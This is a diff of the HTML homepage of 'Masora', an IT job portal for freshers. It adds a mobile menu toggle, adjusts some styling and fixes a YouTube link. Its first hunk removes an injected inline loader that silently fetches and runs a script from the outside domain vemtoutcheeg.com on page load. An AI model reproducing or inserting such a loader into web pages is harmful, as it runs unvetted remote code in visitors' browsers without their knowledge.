@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-      <script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('vemtoutcheeg.com',9547412,document.createElement('script'))</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="index, follow" />
@@ -9,6 +8,7 @@
   <link rel="canonical" href="https://masora.store/" />
   <title>Masora | IT Jobs for Freshers</title>
 
+  <!-- Font Awesome + AOS -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link rel="stylesheet" href="https://unpkg.com/aos@2.3.1/dist/aos.css" />
 
@@ -62,13 +62,13 @@
     }
 
     .logo img {
-      height: 60px;
+      height: 50px;
       margin-right: 10px;
       border-radius: 8px;
     }
 
     .logo span {
-      font-size: 28px;
+      font-size: 24px;
       font-weight: bold;
       color: #FFD700;
     }
@@ -84,12 +84,32 @@
       font-weight: 500;
     }
 
+    .menu-toggle {
+      display: none;
+      font-size: 28px;
+      color: #FFD700;
+      cursor: pointer;
+    }
+
     @media (max-width: 768px) {
       nav {
+        display: none;
         flex-direction: column;
         background: #111;
-        padding: 10px;
+        position: absolute;
+        top: 70px;
+        right: 20px;
+        padding: 15px;
         border-radius: 10px;
+        width: 200px;
+      }
+
+      nav.active {
+        display: flex;
+      }
+
+      .menu-toggle {
+        display: block;
       }
     }
 
@@ -175,12 +195,14 @@
     <span>Loading Masora...</span>
   </div>
 
+  <!-- Header -->
   <header class="header">
     <div class="logo">
-      <img src="logo.jpg" alt="Masora - Freshers Job Portal Logo" loading="lazy"/>
+      <img src="logo.jpg" alt="Masora Logo" loading="lazy" />
       <span>Masora</span>
     </div>
-    <nav>
+    <div class="menu-toggle" id="menu-toggle"><i class="fas fa-bars"></i></div>
+    <nav id="nav-menu">
       <a href="/">Home</a>
       <a href="/about-us.html">About</a>
       <a href="/job-hub.html">Job Hunt</a>
@@ -189,11 +211,13 @@
     </nav>
   </header>
 
+  <!-- Hero Section -->
   <section class="hero" data-aos="fade-down">
     <h1>🚀 Masora – Your IT Job Launchpad</h1>
     <p>Freshers' most trusted platform for Off-Campus Drives, WFH Jobs & Interview Prep.</p>
   </section>
 
+  <!-- Job Coverage -->
   <section class="section" data-aos="fade-up">
     <h2>💼 What We Cover</h2>
     <ul>
@@ -204,6 +228,7 @@
     </ul>
   </section>
 
+  <!-- Placement Prep -->
   <section class="section" data-aos="fade-up">
     <h2>🧠 Placement Preparation</h2>
     <ul>
@@ -213,6 +238,7 @@
     </ul>
   </section>
 
+  <!-- Job Categories -->
   <section class="section" data-aos="fade-up">
     <h2>📂 Popular Job Categories</h2>
     <ul>
@@ -223,16 +249,18 @@
     </ul>
   </section>
 
+  <!-- Call to Action -->
   <section class="highlight" data-aos="fade-up">
     <span>🎯 Whether you're upskilling or job-hunting — Masora is your daily career partner!</span>
     <div class="social-icons" aria-label="Social Media Links">
       <a href="https://www.linkedin.com/company/masora-masora" target="_blank" aria-label="LinkedIn"><i class="fab fa-linkedin"></i></a>
-      <a href="www.youtube.com/@Masora.marketing" target="_blank" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+      <a href="https://www.youtube.com/@Masora.marketing" target="_blank" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
       <a href="https://whatsapp.com/channel/0029VbBOkoRDeON2e4oucL3E" target="_blank" aria-label="WhatsApp"><i class="fab fa-whatsapp"></i></a>
       <a href="https://t.me/masora_marketing" target="_blank" aria-label="Telegram"><i class="fab fa-telegram"></i></a>
     </div>
   </section>
 
+  <!-- Footer -->
   <footer>
     <div>
       <a href="/privacy-policy.html">Privacy Policy</a> |
@@ -241,11 +269,19 @@
     <p>&copy; 2025 Masora. All rights reserved.</p>
   </footer>
 
+  <!-- JS for AOS and Menu Toggle -->
   <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
   <script>
     AOS.init();
     window.addEventListener('load', () => {
       document.getElementById('preloader').style.display = 'none';
+    });
+
+    const menuToggle = document.getElementById('menu-toggle');
+    const navMenu = document.getElementById('nav-menu');
+
+    menuToggle.addEventListener('click', () => {
+      navMenu.classList.toggle('active');
     });
   </script>
 </body>
